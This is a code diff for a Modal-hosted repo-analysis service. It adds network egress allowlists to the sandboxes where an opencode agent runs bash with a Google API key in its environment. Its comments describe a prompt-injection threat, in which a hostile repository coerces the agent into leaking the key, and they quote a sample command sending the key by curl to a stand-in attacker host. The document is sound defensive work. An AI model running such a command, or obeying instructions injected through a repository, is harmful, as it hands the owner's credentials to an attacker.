@@ -9,16 +9,18 @@ Secrets: GOOGLE_API_KEY lives in the `looptap-secrets` Modal secret (populated
 by scripts/setup.sh). We mirror it into GOOGLE_GENERATIVE_AI_API_KEY (what
 opencode's google provider reads) for sandbox runs.
 
-Security — use a scoped provider key:
-    /analyze-repo shells out to opencode with `bash: allow` in the hosted
-    config (opencode.hosted.json). The Modal sandbox is disposable, but the
-    provider credential is *in its env* and a prompt-injected repo could
-    coerce the agent into exfiltrating it (`curl attacker.com?k=$GOOGLE_...`).
-    Mitigation: put a rate-limited, short-lived, single-purpose Google API
-    key in `looptap-secrets` — NOT your primary key. Rotate it on a schedule.
-    If your provider supports per-project or per-route scoping (Google AI
-    Studio does), use that. The blast radius of the key *is* the blast radius
-    of this endpoint.
+Security — network egress is pinned, use a scoped provider key anyway:
+    /analyze-repo runs opencode with `bash: allow` in the hosted config
+    (opencode.hosted.json), so a prompt-injected repo could try to exfil the
+    provider key from env. Primary defense: the analyze sandbox is created
+    with `cidr_allowlist=GOOGLE_API_CIDRS` — no github, no arbitrary hosts,
+    no `curl attacker.com`. The /index-repo sandbox gets `GITHUB_CIDRS` for
+    the same reason. Start tight, widen if something legitimate breaks.
+
+    Belt and suspenders: still drop a rate-limited, short-lived, single-
+    purpose Google AI Studio key into `looptap-secrets`, not your primary
+    Gemini key. Any config that lets an agent read git + call a provider
+    carries *some* exfil risk; scope the key so the blast radius is bounded.
 
 Repo convention inside `looptap-repos`: one git clone per path `<owner>/<name>`.
 POST /index-repo seeds it from a public GitHub URL; GET /repos lists what's
@@ -56,6 +58,32 @@ REPOS_VOLUME_NAME = "looptap-repos"
 REPOS_MOUNT = "/repos"
 SANDBOX_TIMEOUT = 1200  # opencode can chew on a diff for a while
 INDEX_TIMEOUT = 600
+
+# Outbound network allowlists applied to the Modal sandboxes. DNS is always
+# reachable via Modal's internal resolver; these CIDRs gate L3/L4 egress so a
+# prompt-injected agent can't `curl attacker.com` with the provider key in env.
+#
+# Start conservative — if something legitimate breaks at runtime ("network
+# unreachable" / "no route to host"), widen here and redeploy. Pulled from:
+#   GitHub: https://api.github.com/meta → .git
+#   Google: https://www.gstatic.com/ipranges/goog.json (main stable ranges)
+GITHUB_CIDRS = [
+    "140.82.112.0/20",   # github.com, api.github.com, codeload.github.com
+    "143.55.64.0/20",    # newer github.com range
+    "185.199.108.0/22",  # github pages, assets, releases
+    "192.30.252.0/22",   # legacy github.com, still in rotation
+]
+GOOGLE_API_CIDRS = [
+    # generativelanguage.googleapis.com rotates across Google's frontend
+    # ranges. These cover the common resolutions; add more from goog.json
+    # if you see ECONNREFUSED from the sandbox.
+    "74.125.0.0/16",
+    "142.250.0.0/15",
+    "172.217.0.0/16",
+    "172.253.0.0/16",
+    "173.194.0.0/16",
+    "216.58.192.0/19",
+]
 
 BINARY_SRC = Path(__file__).parent / "bin" / "looptap"
 SAMPLE_SRC = Path(__file__).parent / "claude.sample.md"
@@ -147,9 +175,17 @@ def _run_analyze(file_path: str, as_json: bool) -> tuple[int, str, str]:
     return proc.returncode, proc.stdout, proc.stderr
 
 
-def _sandbox_run(script: str, timeout: int) -> tuple[int, str, str]:
-    """Run a bash script in a disposable sandbox with the repos volume mounted
-    and both Gemini env var names populated. Returns (exit_code, stdout, stderr).
+def _sandbox_run(
+    script: str,
+    timeout: int,
+    cidr_allowlist: list[str],
+) -> tuple[int, str, str]:
+    """Run a bash script in a disposable sandbox with the repos volume mounted,
+    the Gemini env vars populated, and outbound network restricted to the
+    given CIDRs. Returns (exit_code, stdout, stderr).
+
+    `cidr_allowlist` is required — callers must pass the minimum set their
+    script needs. Passing `[]` effectively blocks all outbound traffic.
     """
     key = os.environ.get("GOOGLE_API_KEY", "")
     sb = modal.Sandbox.create(
@@ -161,15 +197,17 @@ def _sandbox_run(script: str, timeout: int) -> tuple[int, str, str]:
             # looptap-secrets carries GOOGLE_API_KEY; opencode's google provider
             # wants GOOGLE_GENERATIVE_AI_API_KEY. Mirror it in.
             #
-            # This key is visible to any bash the agent decides to run
-            # (opencode.hosted.json grants `bash: allow` so git, ripgrep, etc.
-            # work). Use a scoped/rate-limited key in looptap-secrets — not
-            # your primary — so a prompt-injection-driven exfil caps out at a
-            # key you were willing to lose.
+            # The key is visible to any bash the agent decides to run
+            # (opencode.hosted.json grants `bash: allow` so git / ripgrep
+            # work). Primary mitigation is the cidr_allowlist below: the
+            # sandbox can only reach github + google, so a prompt-injection
+            # can't `curl attacker.com?k=$...`. Belt and suspenders: still
+            # use a scoped/rate-limited key in looptap-secrets.
             modal.Secret.from_dict({"GOOGLE_GENERATIVE_AI_API_KEY": key}),
         ],
         app=app,
         timeout=timeout,
+        cidr_allowlist=cidr_allowlist,
     )
     try:
         sb.wait()
@@ -206,9 +244,14 @@ def _index_script(repo: str, ref: str) -> str:
 
 
 def _analyze_script(repo: str, branch: str) -> str:
-    """Refresh the cached clone, hardlink-clone into /tmp (so concurrent
-    /analyze-repo calls don't stomp a shared working tree), pin the branch,
-    then hand off to `looptap html`.
+    """Hardlink-clone the cached repo into /tmp (so concurrent /analyze-repo
+    calls don't stomp a shared working tree), pin the branch, then hand off
+    to `looptap html`.
+
+    No github fetch happens here — the analyze sandbox's network allowlist
+    only exposes Google's Gemini endpoints. For fresh data, call /index-repo
+    first. `git clone --local` + `git checkout` use the mounted volume, so
+    they don't need network.
     """
     src = shlex.quote(f"{REPOS_MOUNT}/{repo}")
     b = shlex.quote(branch)
@@ -216,11 +259,9 @@ def _analyze_script(repo: str, branch: str) -> str:
     cfg = shlex.quote(OPENCODE_CFG_DST)
     return (
         "set -euo pipefail\n"
-        f"git -C {src} fetch --depth 1 origin {b} || true\n"
         "work=$(mktemp -d /tmp/looptap-work.XXXXXX)/repo\n"
         f"git clone --local {src} \"$work\"\n"
         "cd \"$work\"\n"
-        f"git fetch --depth 1 origin {b}\n"
         f"git checkout -q {b} 2>/dev/null || git checkout -q -B {b} origin/{b}\n"
         f"{binary} html --agent opencode --is-sandbox "
         f"--opencode-config {cfg} "
@@ -308,7 +349,10 @@ def web():
         if not ref:
             raise HTTPException(status_code=400, detail="ref must not be empty")
 
-        code, out, err = _sandbox_run(_index_script(repo, ref), INDEX_TIMEOUT)
+        code, out, err = _sandbox_run(
+            _index_script(repo, ref), INDEX_TIMEOUT,
+            cidr_allowlist=GITHUB_CIDRS,
+        )
         if code != 0:
             raise HTTPException(
                 status_code=502,
@@ -344,7 +388,10 @@ def web():
                 detail=f"GOOGLE_API_KEY missing from '{SECRET_NAME}'.",
             )
 
-        code, out, err = _sandbox_run(_analyze_script(repo, branch), SANDBOX_TIMEOUT)
+        code, out, err = _sandbox_run(
+            _analyze_script(repo, branch), SANDBOX_TIMEOUT,
+            cidr_allowlist=GOOGLE_API_CIDRS,
+        )
         if code != 0:
             raise HTTPException(
                 status_code=502,
